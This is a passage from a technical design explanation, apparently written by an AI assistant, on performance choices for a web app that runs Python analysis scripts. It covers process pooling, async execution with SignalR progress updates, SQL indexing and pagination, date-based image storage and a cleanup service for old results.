            process = StartPythonProcess();  // Replace dead process
        }

        await _pool.Writer.WriteAsync(process);
    }
}
```

**Benefit**: Eliminates 50-100ms startup overhead.

**2. Caching Matplotlib Backend**
```python
# At script start
import matplotlib
matplotlib.use('Agg')  # Set once, cached by Python

# This is fast on subsequent imports
import matplotlib.pyplot as plt
```

**3. Async Execution (Don't Block UI)**
```csharp
public async Task<IActionResult> OnPostRunAnalysisAsync(Guid scriptId, ...)
{
    // Start analysis in background
    _ = Task.Run(async () =>
    {
        using var scope = _serviceScopeFactory.CreateAsyncScope();
        var analysisService = scope.ServiceProvider.GetRequiredService<IAnalysisService>();

        await analysisService.ExecuteAnalysisAsync(datasetId, scriptId, parameters);
    });

    // Return immediately
    TempData["Message"] = "Analysis started. Refresh to see results.";
    return RedirectToPage();
}
```

**Alternative: SignalR for Real-Time Updates**
```csharp
// Server-side
public async Task ExecuteAnalysisAsync(string connectionId, ...)
{
    await _hubContext.Clients.Client(connectionId).SendAsync("AnalysisProgress", 0);

    // Execute script...

    await _hubContext.Clients.Client(connectionId).SendAsync("AnalysisProgress", 50);

    // More execution...

    await _hubContext.Clients.Client(connectionId).SendAsync("AnalysisComplete", result);
}

// Client-side (JavaScript)
connection.on("AnalysisProgress", (percent) => {
    updateProgressBar(percent);
});

connection.on("AnalysisComplete", (result) => {
    displayResult(result);
});
```

### Database Performance

**Query Optimization**:

```sql
-- Good: Use index for dataset lookup
SELECT * FROM AnalysisResults
WHERE DatasetId = @datasetId
ORDER BY ExecutionDate DESC
LIMIT 10;

-- Add index
CREATE INDEX IX_AnalysisResults_DatasetId_ExecutionDate
ON AnalysisResults(DatasetId, ExecutionDate DESC);

-- Bad: Full table scan
SELECT * FROM AnalysisResults
WHERE ScriptName LIKE '%analysis%';  -- No index on ScriptName
```

**Pagination for Large Result Sets**:
```csharp
public async Task<List<AnalysisResult>> GetAnalysisHistoryAsync(
    Guid datasetId,
    int page = 1,
    int pageSize = 10)
{
    return await _context.AnalysisResults
        .Where(r => r.DatasetId == datasetId)
        .OrderByDescending(r => r.ExecutionDate)
        .Skip((page - 1) * pageSize)
        .Take(pageSize)
        .ToListAsync();
}
```

### File System Performance

**Image Storage Strategy**:

```
wwwroot/analysis-results/
├── 2025/
│   └── 11/
│       └── 07/
│           ├── result_abc123_001.png
│           ├── result_abc123_002.png
│           └── ...
```

**Why Date-Based Directories?**
- **Avoid Large Directories**: File systems slow down with >10,000 files/directory
- **Easy Cleanup**: Delete old results by removing date folders
- **Logical Organization**: Find results by date

**Implementation**:
```csharp
public string GetOutputDirectory()
{
    var now = DateTime.UtcNow;
    var path = Path.Combine(
        _options.Value.OutputDirectory,
        now.Year.ToString(),
        now.Month.ToString("00"),
        now.Day.ToString("00")
    );

    Directory.CreateDirectory(path);
    return path;
}
```

**Cleanup Old Results** (Background Task):
```csharp
public class CleanupService : BackgroundService
{
    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        while (!stoppingToken.IsCancellationRequested)
        {
            // Run daily at 2 AM
            await Task.Delay(TimeSpan.FromHours(24), stoppingToken);

            // Delete results older than 90 days
            var cutoffDate = DateTime.UtcNow.AddDays(-90);

            var oldResults = await _context.AnalysisResults
                .Where(r => r.ExecutionDate < cutoffDate)
                .ToListAsync(stoppingToken);

            foreach (var result in oldResults)
            {
                // Delete image file
                var imagePath = Path.Combine(_webRoot, result.ResultImagePath);
                if (File.Exists(imagePath))
                {
                    File.Delete(imagePath);
                }

                // Delete database record
                _context.AnalysisResults.Remove(result);
            }

            await _context.SaveChangesAsync(stoppingToken);

            _logger.LogInformation("Cleaned up {Count} old analysis results", oldResults.Count);
        }
    }
}
```

---

This elaboration provides deep technical context for decision-making. Each section explains not just "what" but "why" and "alternatives considered".

Would you like me to elaborate on any specific section further?
